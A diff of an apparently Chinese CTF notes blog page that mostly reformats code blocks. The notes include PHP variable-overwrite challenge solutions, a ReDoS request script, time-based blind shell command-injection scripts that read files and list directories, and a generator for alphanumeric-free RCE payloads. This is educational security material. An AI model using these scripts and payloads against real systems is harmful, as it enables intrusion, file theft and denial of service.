@@ -407,21 +407,21 @@ $a === $b ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-13
+                    2023-04-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.3k
+                    4.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    20 分
                 </div>
                 
 
@@ -790,89 +790,85 @@ getshell方法:
 正负号             ?num=+4476.0
 </code></pre>
 <p>下面记一道$$覆盖赋值的题:</p>
-<pre class="line-numbers language-php"><code class="language-php">
+<pre><code>
+&lt;?php
 
-<span class="token delimiter">&lt;?php</span>
+highlight_file(__FILE__);
+include(&#39;flag.php&#39;);
+error_reporting(0);
 
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$error=&#39;你还想要flag嘛？&#39;;
+$suces=&#39;既然你想要那给你吧！&#39;;
 
-<span class="token variable">$error</span><span class="token operator">=</span><span class="token string">'你还想要flag嘛？'</span><span class="token punctuation">;</span>
-<span class="token variable">$suces</span><span class="token operator">=</span><span class="token string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span>
+foreach($_GET as $key =&gt; $value)&#123;        //自己传入的x是key,flag是value
+    if($key===&#39;error&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key=$$value;                       //$(x)=$(flag)，现在相当于x变量就是flag
+&#125;
 
-<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        </span><span class="token comment" spellcheck="true">//自己传入的x是key,flag是value</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//$(x)=$(flag)，现在相当于x变量就是flag</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+foreach($_POST as $key =&gt; $value)&#123;       //自己传入的error是key,x是value
+    if($value===&#39;flag&#39;)&#123;
+        die(&quot;what are you doing?!&quot;);
+    &#125;
+    $$key=$$value;                       //$(error)=$(x)=$(flag)，相当于把error变量重构
+&#125;
 
-<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span><span class="token comment" spellcheck="true">//自己传入的error是key,x是value</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-    $<span class="token variable">$key</span><span class="token operator">=</span>$<span class="token variable">$value</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//$(error)=$(x)=$(flag)，相当于把error变量重构</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+if(!($_POST[&#39;flag&#39;]==$flag))&#123;
+    die($error);                         //error输出时其实已经是flag了
+&#125;
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//error输出时其实已经是flag了</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
+die($suces);
 
-<span class="token keyword">echo</span> <span class="token string">"your are good"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
-<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token delimiter">?></span>
-解法<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token constant">GET</span><span class="token punctuation">)</span><span class="token operator">?</span>x<span class="token operator">=</span><span class="token function">flag</span>   <span class="token punctuation">(</span><span class="token constant">POST</span><span class="token punctuation">)</span>error<span class="token operator">=</span>x
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;
+解法:(GET)?x=flag   (POST)error=x
+</code></pre>
 <p>再来一题</p>
-<pre class="line-numbers language-php"><code class="language-php">
+<pre><code>
+&lt;?php
 
-<span class="token delimiter">&lt;?php</span>
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;flag.php&quot;);
 
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+function getFlag(&amp;$v1,&amp;$v2)&#123;
+    eval(&quot;$$v1 = &amp;$$v2;&quot;);
+    var_dump($$v1);
+&#125;
 
-<span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$$v1 = &amp;$$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">var_dump</span><span class="token punctuation">(</span>$<span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 = $_GET[&#39;v1&#39;];
+    $v2 = $_GET[&#39;v2&#39;];
+    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v1))&#123;
+            die(&quot;error v1&quot;);
+    &#125;
     
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;, $v2))&#123;
+            die(&quot;error v2&quot;);
+    &#125;
     
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    if(preg_match(&#39;/ctfshow/&#39;, $v1))&#123;
+            getFlag($v1,$v2);
+    &#125;
+&#125;
 
-<span class="token delimiter">?></span>
-解法<span class="token punctuation">:</span><span class="token operator">?</span>v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;
+解法:?v1=ctfshow&amp;v2=GLOBALS
+</code></pre>
 <p>reDOS攻击EXP</p>
-<pre class="line-numbers language-Python"><code class="language-Python">
-
+<pre><code>
 #原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止
 import requests
-url="??????????"
+url=&quot;??????????&quot;
 data=&#123;
-    '?':'???'*250000+'?????'
+    &#39;?&#39;:&#39;???&#39;*250000+&#39;?????&#39;
 &#125;
 r=requests.post(url,data=data)
 print(r.text)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>bash盲注EXP</p>
-<pre class="line-numbers language-Python"><code class="language-Python">
-
+<pre><code>
 //一些语句自己改正
 #!/usr/bin/env python3
 #-*- coding:utf-8 -*-
@@ -880,55 +876,54 @@ print(r.text)
 import requests
 import time as t
 from urllib.parse import quote as urlen
-url  = '??????/??='????';'
-alphabet = ['&#123;','&#125;', '.', '@', '-','_','=','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
+url  = &#39;??????/??=&#39;????&#39;;&#39;
+alphabet = [&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;.&#39;, &#39;@&#39;, &#39;-&#39;,&#39;_&#39;,&#39;=&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]
 
-result = ''
+result = &#39;&#39;
 for i in range(1,50):
     for char in alphabet:
-        # payload = "if [ `ls  | grep 'flag' |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi".format(i,char) #flag.php
-        payload = "if [ `cat flag.php | grep 'flag' |cut -c&#123;&#125;` = '&#123;&#125;' ];then sleep 5;fi".format(i,char)
-        # data = &#123;'cmd':payload&#125;
+        # payload = &quot;if [ `ls  | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char) #flag.php
+        payload = &quot;if [ `cat flag.php | grep &#39;flag&#39; |cut -c&#123;&#125;` = &#39;&#123;&#125;&#39; ];then sleep 5;fi&quot;.format(i,char)
+        # data = &#123;&#39;cmd&#39;:payload&#125;
         try:
             start = int(t.time())
             r = requests.get(url+payload)
             # r = requests.post(url, data=data)
             end = int(t.time()) - start
-            if end >= 3:        
+            if end &gt;= 3:        
                 result += char
-                print("Flag: "+result)
+                print(&quot;Flag: &quot;+result)
                 break
         except Exception as e:
             print(e)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>Shell命令盲注脚本</p>
-<pre class="line-numbers language-Python"><code class="language-Python">
-
+<pre><code>
 //列出目录
 import requests
 import time
 import string
 
-str=string.ascii_letters+string.digits+'_~'
-result=""
+str=string.ascii_letters+string.digits+&#39;_~&#39;
+result=&quot;&quot;
 for i in range(1,10):#行
     key=0
     for j in range(1,15):#列
         if key==1:
             break
         for n in str:
-            payload="if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi".format(i,j,n)
+            payload=&quot;if [ `ls /|awk &#39;NR==&#123;0&#125;&#39;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)
             #print(payload)
-            url="?????/?c="+payload
+            url=&quot;?????/?c=&quot;+payload
             try:
                 requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况
             except:
                 result=result+n
                 print(result)
                 break
-            if n=='~':
+            if n==&#39;~&#39;:
                 key=1
-                result+=" "
+                result+=&quot; &quot;
                 
                 
 //获取值
@@ -936,58 +931,57 @@ import requests
 import time
 import string
 
-str=string.digits+string.ascii_lowercase+"-"
-result=""
+str=string.digits+string.ascii_lowercase+&quot;-&quot;
+result=&quot;&quot;
 key=0
 for j in range(1,45):
     print(j)
     if key==1:
         break
     for n in str:
-        payload="if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi".format(j,n)
+        payload=&quot;if [ `cat /1.php|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)
         #print(payload)
-        url="?????/?c="+payload
+        url=&quot;?????/?c=&quot;+payload
         try:
             requests.get(url,timeout=(2.5,2.5))
         except:
             result=result+n
             print(result)
             break
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>无字母数字RCE脚本</p>
-<pre class="line-numbers language-Python"><code class="language-Python">
-
+<pre><code>
 import re
 
-content = ''
-preg = '[a-z]|[0-9]' # 题目过滤正则
+content = &#39;&#39;
+preg = &#39;[a-z]|[0-9]&#39; # 题目过滤正则
 # 生成字典
 for i in range(256):
     for j in range(256):
         if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
             k = i | j
-            if 32 <= k <= 126:
-                a = '%' + hex(i)[2:].zfill(2)
-                b = '%' + hex(j)[2:].zfill(2)
-                content += (chr(k) + ' ' + a + ' ' + b + '\n')
-f = open('rce_or.txt', 'w')
+            if 32 &lt;= k &lt;= 126:
+                a = &#39;%&#39; + hex(i)[2:].zfill(2)
+                b = &#39;%&#39; + hex(j)[2:].zfill(2)
+                content += (chr(k) + &#39; &#39; + a + &#39; &#39; + b + &#39;\n&#39;)
+f = open(&#39;rce_or.txt&#39;, &#39;w&#39;)
 f.write(content)
 
 while True:
-    payload1 = ''
-    payload2 = ''
-    code = input("data:")
+    payload1 = &#39;&#39;
+    payload2 = &#39;&#39;
+    code = input(&quot;data:&quot;)
     for i in code:
-        f = open('rce_or.txt')
+        f = open(&#39;rce_or.txt&#39;)
         lines = f.readlines()
         for line in lines:
             if i == line[0]:
                 payload1 = payload1 + line[2:5]
                 payload2 = payload2 + line[6:9]
                 break
-    payload = '("'+payload1+'"|"'+payload2+'")'
-    print("payload: "+ payload)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    payload = &#39;(&quot;&#39;+payload1+&#39;&quot;|&quot;&#39;+payload2+&#39;&quot;)&#39;
+    print(&quot;payload: &quot;+ payload)
+</code></pre>
 <p>各种可用的PHP类</p>
 <pre><code>FilesystemIterator
 遍历文件
@@ -1301,7 +1295,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">85.4k</span>
+                        class="white-color">86.5k</span>
             
             
             
